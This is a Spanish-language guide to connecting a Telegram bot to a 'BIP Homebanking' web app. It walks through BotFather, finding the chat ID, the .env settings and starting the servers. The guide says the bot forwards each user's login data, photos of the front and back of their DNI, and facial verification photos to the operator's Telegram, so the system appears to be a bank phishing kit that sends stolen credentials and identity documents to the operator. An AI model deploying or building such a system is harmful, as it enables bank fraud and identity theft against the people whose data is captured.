# 🤖 Guía de Configuración del Bot de Telegram

## Paso 1️⃣: Crear el Bot de Telegram

1. **Abre Telegram** en tu teléfono o computadora
2. **Busca** `@BotFather` (es el bot oficial de Telegram para crear bots)
3. **Envía el comando:** `/newbot`
4. **Elige un nombre** para tu bot (ejemplo: "BIP Homebanking Monitor")
5. **Elige un username** que termine en `bot` (ejemplo: "bip_homebanking_bot")
6. **Guarda el Token** que te da BotFather (se ve así: `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`)

## Paso 2️⃣: Obtener tu Chat ID

### Opción A - Usando un bot auxiliar (MÁS FÁCIL):
1. Busca `@userinfobot` en Telegram
2. Envíale cualquier mensaje
3. Te responderá con tu **Chat ID** (un número como `123456789`)

### Opción B - Usando la API:
1. Envía un mensaje a tu bot recién creado
2. Abre en tu navegador: 
   ```
   https://api.telegram.org/bot<TU_TOKEN>/getUpdates
   ```
   (Reemplaza `<TU_TOKEN>` con el token que te dio BotFather)
3. Busca `"chat":{"id":123456789}` - ese número es tu Chat ID

## Paso 3️⃣: Configurar el Backend

1. **Copia el archivo de ejemplo:**
   - Ve a la carpeta `homebanking-backend`
   - Copia `.env.example` y renómbralo a `.env`

2. **Edita el archivo `.env` con tus datos:**
   ```env
   PORT=3001
   JWT_SECRET=tu_clave_secreta_muy_segura
   TELEGRAM_BOT_TOKEN=1234567890:ABCdefGHIjklMNOpqrsTUVwxyz
   TELEGRAM_CHAT_ID=123456789
   CORS_ORIGIN=http://localhost:5173
   ```

## Paso 4️⃣: Probar que funciona

1. **Inicia el backend:**
   ```bash
   cd homebanking-backend
   npm install
   npm run dev
   ```

2. **Inicia el frontend:**
   ```bash
   cd homebanking-frontend
   npm install
   npm run dev
   ```

3. **Prueba el sistema:**
   - Abre http://localhost:5173
   - Haz login con: `usuario: admin` / `contraseña: admin123`
   - Verifica que lleguen notificaciones a Telegram

## 📱 Notificaciones que Recibirás

El bot te enviará:
- ✅ **Notificaciones de login** con datos del usuario
- 📄 **Fotos del DNI** (frente y dorso)
- 😊 **Foto de verificación facial** con métricas de calidad

## ⚠️ Importante

- **Nunca compartas** tu TELEGRAM_BOT_TOKEN
- **Mantén seguro** tu archivo `.env`
- **No subas** el archivo `.env` a GitHub o repositorios públicos

## 🔍 Solución de Problemas

### No llegan las notificaciones:
1. Verifica que el token y chat ID sean correctos
2. Asegúrate de haber enviado al menos un mensaje a tu bot
3. Revisa la consola del backend para ver errores

### Error "Chat not found":
- Envía un mensaje al bot primero (cualquier mensaje como "/start")
- Vuelve a obtener el Chat ID

### El bot no responde:
- Verifica que el token sea correcto
- Asegúrate de que el bot esté activo en BotFather

---

## 🎉 ¡Listo!

Una vez configurado, tu sistema BIP estará enviando todas las verificaciones a Telegram de forma automática y segura.
